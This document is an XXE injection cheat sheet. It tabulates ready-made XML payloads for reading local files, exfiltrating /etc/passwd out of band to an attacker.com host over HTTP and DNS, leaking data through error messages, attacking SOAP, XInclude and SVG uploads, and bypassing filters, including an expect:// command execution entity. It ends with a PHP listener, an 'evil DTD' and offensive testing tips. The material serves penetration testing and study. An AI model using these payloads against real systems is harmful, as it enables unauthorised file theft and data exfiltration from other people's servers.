# Comprehensive Guide to XXE Injection Patterns

## Basic File Reading

|Type|Description|Example Payload|
|---|---|---|
|Basic Local File|Reads local system files directly|`xml<br><!DOCTYPE foo [<br> <!ENTITY xxe SYSTEM "file:///etc/passwd"><br>]><br><root><name>&xxe;</name></root>`|
|PHP Filter (Base64)|Encodes file content to avoid parsing issues|`xml<br><!DOCTYPE foo [<br> <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"><br>]><br><root><name>&xxe;</name></root>`|
|Directory Listing|Lists contents of directories|`xml<br><!DOCTYPE foo [<br> <!ENTITY xxe SYSTEM "file:///"><br>]><br><root><name>&xxe;</name></root>`|

## Out-of-Band (OOB) Exfiltration

|Type|Description|Example Payload|
|---|---|---|
|Basic OOB|Sends data to external server|`xml<br><!DOCTYPE foo [<br> <!ENTITY % file SYSTEM "file:///etc/passwd"><br> <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"><br> %dtd;<br>]><br><root><name>&send;</name></root>`|
|Parameter Entity|Uses parameter entities for data exfiltration|`xml<br><!ENTITY % file SYSTEM "file:///etc/passwd"><br><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>"><br>%eval;<br>%exfil;`|
|DNS Exfiltration|Exfiltrates data via DNS requests|`xml<br><!DOCTYPE foo [<br> <!ENTITY % file SYSTEM "file:///etc/passwd"><br> <!ENTITY % dtd "<!ENTITY send SYSTEM 'http://%file;.attacker.com'>"><br> %dtd;<br>]><br><root><name>&send;</name></root>`|

## Error-Based Techniques

|Type|Description|Example Payload|
|---|---|---|
|Invalid URI|Forces error messages containing file content|`xml<br><!DOCTYPE foo [<br> <!ENTITY % file SYSTEM "file:///etc/passwd"><br> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///%file;'>"><br> %eval;<br> %error;<br>]><br><root><name>test</name></root>`|
|DTD Validation|Uses DTD validation errors to leak data|`xml<br><!DOCTYPE foo [<br> <!ENTITY % file SYSTEM "file:///etc/passwd"><br> <!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://invalid/%file;'>"><br> %eval;<br> %test;<br>]><br><root><name>test</name></root>`|

## Advanced Techniques

|Type|Description|Example Payload|
|---|---|---|
|SOAP Injection|XXE in SOAP requests|`xml<br><?xml version="1.0"?><br><!DOCTYPE soap:Envelope [<br> <!ENTITY xxe SYSTEM "file:///etc/passwd"><br>]><br><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>`|
|XInclude|XXE using XInclude|`xml<br><foo xmlns:xi="http://www.w3.org/2001/XInclude"><br> <xi:include parse="text" href="file:///etc/passwd"/><br></foo>`|
|SVG Upload|XXE via SVG file upload|`xml<br><?xml version="1.0" standalone="yes"?><br><!DOCTYPE test [ <br> <!ENTITY xxe SYSTEM "file:///etc/passwd"> <br>]><br><svg xmlns="http://www.w3.org/2000/svg"><br> <text>&xxe;</text><br></svg>`|

## Mitigation Bypasses

|Type|Description|Example Payload|
|---|---|---|
|UTF-16 Encoding|Bypasses certain filters|`xml<br><?xml version="1.0" encoding="UTF-16"?><br><!DOCTYPE foo [<br> <!ENTITY xxe SYSTEM "file:///etc/passwd"><br>]><br><root><name>&xxe;</name></root>`|
|Protocol Wrapping|Bypasses protocol restrictions|`xml<br><!DOCTYPE foo [<br> <!ENTITY xxe SYSTEM "expect://id"><br>]><br><root><name>&xxe;</name></root>`|
|Nested Entities|Bypasses entity restrictions|`xml<br><!DOCTYPE foo [<br> <!ENTITY % a "<!ENTITY &#x25; b 'file:///etc/passwd'>"><br> %a;<br> %b;<br>]><br><root><name>&xxe;</name></root>`|

## Common Tools and Setup

**Listener Setup:**

php

Copy

<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

**Evil DTD (xxe.dtd):**

xml

Copy

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;

Run HTML

## Best Practices for Testing

- Always start with simple file reads to verify XXE vulnerability
    
- Use PHP filters when dealing with special characters
    
- Switch to OOB techniques when direct output is not visible
    
- Consider error-based techniques when other methods fail
    
- Always URL-encode special characters in OOB payloads
    
- Test for different protocol handlers (file://, php://, expect://)
    
- Try different encodings if initial attempts fail